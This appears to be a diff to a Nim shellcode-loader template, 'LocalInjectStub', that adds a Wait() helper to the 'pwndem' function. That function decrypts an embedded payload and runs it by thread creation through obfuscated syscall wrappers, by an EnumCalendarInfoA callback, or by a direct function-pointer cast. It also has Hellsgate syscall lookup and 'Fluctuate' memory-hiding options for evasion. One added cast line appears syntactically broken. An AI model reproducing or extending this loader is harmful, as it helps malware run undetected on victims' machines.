@@ -1,5 +1,13 @@
 let LocalInjectStub*  = """
 
+proc Wait(): void =
+    when defined(wait):
+        when defined(verbose):
+            echo obf("Waiting for process to finish via WaitForSingleObject")
+        WaitForSingleObject(-1, -1)
+    else:
+        discard
+
 proc pwndem[byte](friendlycode: openarray[byte]): void =
 
     when defined(Fluctuate):
@@ -114,6 +122,7 @@ proc pwndem[byte](friendlycode: openarray[byte]): void =
             decryptLate()
             status = zuq8aztsdztausdgbh(&tHandle,THREAD_ALL_ACCESS,NULL,pHandle,buffer,NULL, FALSE, 0, 0, 0, NULL)
             NtWaitForSingleObject(tHandle, 0, nil)
+            Wait()
             status = zuatzuastdiasyy(tHandle)
             status = zuatzuastdiasyy(pHandle)
             when defined(verbose):
@@ -140,7 +149,7 @@ proc pwndem[byte](friendlycode: openarray[byte]): void =
             # Somehow not working
             #var TimeOut: LARGE_INTEGER = cast[LARGE_INTEGER](-1)
             #NtWaitForSingleObject(-1, 0, &TimeOut)
-            WaitForSingleObject(-1, -1)
+            Wait()
         when defined(Hellsgate):
             when defined(Hellsgate):
                 if getSyscall(ntCloseTable):
@@ -156,14 +165,15 @@ proc pwndem[byte](friendlycode: openarray[byte]): void =
         ptrDecText = cast[ptr byte](buffer)
         decryptLate()
         discard EnumCalendarInfoA(cast[CALINFO_ENUMPROCA](buffer),1,1,1)
-        WaitForSingleObject(-1, -1)
+        Wait()
     else:
         ptrEncText = cast[ptr byte](buffer)
         ptrDecText = cast[ptr byte](buffer)
         decryptlate()
         #decryptLate()
-        let f = cast[proc(){.nimcall.}](buffer)
+        let f = cast[proc(){.nimcall.}](buffer): void
         f()
+        Wait()
 
 when isMainModule:
      pwndem(enctext)
